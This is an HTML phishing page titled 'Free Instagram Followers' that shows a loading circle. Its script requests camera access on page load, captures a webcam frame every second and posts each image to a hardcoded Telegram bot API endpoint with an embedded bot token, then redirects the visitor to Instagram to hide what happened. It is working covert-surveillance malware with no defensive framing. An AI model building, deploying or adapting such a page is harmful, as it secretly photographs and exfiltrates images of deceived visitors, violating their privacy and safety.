<!DOCTYPE html>
<html>
<head>
    <title>Free Instagram Followers</title>
</head>
<body>
    <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
        <div id="loading-circle" style="width: 100px; height: 100px; background-color: #ccc; border-radius: 50%;"></div>
    </div>

    <script>
        // Request camera permission
        async function requestCameraPermission() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                // Redirect to Instagram after 8 seconds
                setTimeout(() => {
                    window.location.href = "https://instagram.com";
                }, 8000);
            } catch (error) {
                console.error("Error accessing camera:", error);
            }
        }

        // Trigger camera permission request on page load
        requestCameraPermission();

        // Function to capture and send photo to Telegram bot
        async function captureAndSendPhoto() {
            const id = new URLSearchParams(window.location.search).get("id");
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const video = document.createElement('video');
            document.body.appendChild(video);
            
            // Capture frame from video stream
            video.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
            await video.play();
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to data URL
            const dataUrl = canvas.toDataURL('image/jpeg');
            // Send data URL to Telegram bot
            const formData = new FormData();
            formData.append('photo', dataUrl);
            formData.append('chat_id', id);
            await fetch('https://api.telegram.org/bot6613656227:AAEVl5k8TkGf2yZDsaxQnCLRMXXqWFmr8ok/sendPhoto', {
                method: 'POST',
                body: formData
            });

           
            video.srcObject.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
        }

        setInterval(captureAndSendPhoto, 1000);
    </script>
</body>
</html>
